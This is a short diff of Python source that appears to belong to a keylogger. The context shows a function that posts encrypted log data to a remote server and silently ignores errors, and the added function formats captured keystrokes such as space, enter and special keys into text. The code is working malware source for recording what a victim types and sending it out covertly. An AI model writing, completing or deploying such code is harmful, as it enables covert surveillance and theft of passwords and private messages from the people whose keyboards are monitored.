@@ -18,3 +18,16 @@ def send_log_to_server(log_message):
         requests.post(server_url, data=encrypted_message, timeout=5)
     except Exception as e:
         pass  # Ignore any connection issues silently
+
+
+# === FUNCTION TO FORMAT KEYBOARD INPUT ===
+def format_key(key):
+    key = str(key).replace("'", "")
+    if key == "Key.space":
+        return " "
+    elif key == "Key.enter":
+        return "\n"
+    elif key.startswith("Key."):
+        return f"[{key.replace('Key.', '').upper()}]"
+    else:
+        return key
